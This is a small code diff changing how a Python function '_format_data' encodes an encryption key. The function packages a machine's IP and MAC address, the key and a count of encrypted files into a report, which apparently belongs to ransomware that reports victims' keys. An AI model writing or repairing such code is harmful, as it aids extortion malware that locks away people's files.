@@ -11,7 +11,7 @@ def _format_data(encryption_key : bytes, encrypted_files : int):
     return {
         'ip': get_ip_address(),
         'macAddress': get_mac_address(),
-        'encryptionKey': str(encryption_key),
+        'encryptionKey': encryption_key.decode('utf-8'),
         'encryptedFiles': encrypted_files
     }
 
